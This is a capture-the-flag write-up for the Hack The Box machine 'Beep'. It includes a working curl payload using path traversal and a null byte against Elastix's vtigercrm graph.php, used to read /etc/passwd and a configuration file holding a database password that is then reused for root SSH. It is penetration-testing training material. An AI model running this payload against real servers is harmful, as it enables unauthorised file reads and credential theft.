# Hack The Box – Beep Write-Up

# 1. Enumeration

## Nmap Scan

```bash
nmap -p- -sV -sC -T4 -oN beep.txt beep.htb
```

### Key Findings

| Port  | Service  | Version               |
| ----- | -------- | --------------------- |
| 22    | SSH      | OpenSSH 4.3           |
| 80    | HTTP     | Apache 2.2.3 (CentOS) |
| 443   | HTTPS    | Apache 2.2.3 (CentOS) |
| 3306  | MySQL    | Detected              |
| 5038  | Asterisk | Asterisk Call Manager |
| 10000 | Webmin   | MiniServ 1.570        |

Observations:

* Large attack surface
* Multiple legacy services
* Apache 2.2.3 on CentOS
* HTTPS presents an Elastix login portal

---

# 2. TLS Compatibility Issue

Modern browsers failed to load the HTTPS page due to TLS 1.0 being the highest supported version.

Testing with OpenSSL:

```bash
openssl s_client -connect beep.htb:443 -tls1
```

Confirmed TLS 1.0 support.

To interact with the site without modifying browser settings:

```bash
curl -k --tlsv1 https://beep.htb
```

The `-k` flag ignores certificate validation errors.

---

# 3. Web Enumeration

Directory brute forcing:

```bash
gobuster dir -u https://beep.htb/ \
-w /usr/share/wordlists/dirb/common.txt \
-k -t 40
```

Discovered directories:

```
admin/
configs/
help/
modules/
panel/
```

Manual inspection of the main page revealed an Elastix login interface.

---

# 4. Vulnerability Research

Search for known vulnerabilities:

```bash
searchsploit elastix
```

Identified:

* Elastix 2.x – Local File Inclusion
* Exploit-DB ID: 37637

The vulnerability affects:

```
/vtigercrm/graph.php
```

---

# 5. Confirming Local File Inclusion

Tested LFI by attempting to read `/etc/passwd`:

```bash
curl -k --tlsv1 "https://beep.htb/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action"
```

The contents of `/etc/passwd` were returned, confirming arbitrary file read.

The `%00` null byte injection bypasses PHP extension enforcement in legacy PHP versions.

---

# 6. Extracting Credentials

Targeted sensitive configuration file:

```
/etc/amportal.conf
```

Command used:

```bash
curl -k --tlsv1 "https://beep.htb/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action" \
| grep -E "AMPDBUSER|AMPDBPASS"
```

Output:

```
AMPDBUSER=asteriskuser
AMPDBPASS=jEhdIekWmdjE
```

This revealed the database credentials.

---

# 7. SSH Access

Attempting SSH login:

```bash
ssh root@10.129.229.183
```

Connection failed due to deprecated key exchange algorithms.

Server supported only SHA1-based key exchange methods.

Adjusted SSH command:

```bash
ssh root@10.129.229.183 \
-o KexAlgorithms=+diffie-hellman-group1-sha1 \
-o HostKeyAlgorithms=+ssh-rsa \
-o PubkeyAcceptedAlgorithms=+ssh-rsa
```

Password used:

```
jEhdIekWmdjE
```

Successful login as root.

This indicates password reuse between the database credentials and the root SSH account.

---

# 8. Flag Retrieval

## User Flag

```bash
cat /home/fanis/user.txt
```

## Root Flag

```bash
cat /root/root.txt
```

---

# 9. Attack Chain Summary

1. Enumerated services with Nmap
2. Identified Elastix web application
3. Researched known vulnerabilities
4. Exploited LFI in vtigerCRM component
5. Retrieved database credentials from configuration file
6. Leveraged password reuse to access root via SSH
7. Retrieved user and root flags

---

# 10. Security Weaknesses Identified

* TLS 1.0 enabled
* Legacy Apache and PHP versions
* Local File Inclusion vulnerability
* Sensitive configuration file exposure
* Password reuse across services
* Root SSH login enabled
* Deprecated SSH cryptographic algorithms

---

# Conclusion

The compromise required no remote code execution or privilege escalation. Root access was achieved through proper enumeration, vulnerability research, exploitation of a Local File Inclusion vulnerability, and credential reuse.

This machine highlights the risks associated with:

* Legacy software
* Poor credential hygiene
* Exposed configuration files
* Outdated cryptographic standards

The challenge emphasizes methodical enumeration and understanding application architecture over blind brute forcing.

---
